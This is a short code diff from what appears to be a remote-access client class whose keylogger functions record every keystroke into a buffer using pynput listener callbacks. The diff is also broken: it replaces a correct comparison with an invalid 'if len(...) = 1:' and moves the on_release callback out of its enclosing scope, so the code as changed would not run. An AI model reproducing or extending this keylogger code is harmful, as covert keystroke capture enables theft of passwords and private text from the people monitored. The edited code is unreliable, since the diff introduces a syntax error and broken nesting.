@@ -19,17 +19,17 @@ class CLIENT:
         def on_press(key):
             if not self.KEYLOGGER_STATUS:
                 return False
-        
+
         key = str(key)
 
-        if len(key.strip('\'')) == 1:
+        if len(key.strip('\'')) = 1:
             self.KEYLOGGER_STROKES += key.strip('\'')
         else:
             self.KEYLOGGER_STROKES += ("[" + key + "]")
 
-        def on_release(key):
-            if not self.KEYLOGGER_STATUS:
-                return False
+    def on_release(key):
+        if not self.KEYLOGGER_STATUS:
+            return False
         
         def logger():
             with Listener(on_press=on_press, on_release=on_release) as listener:
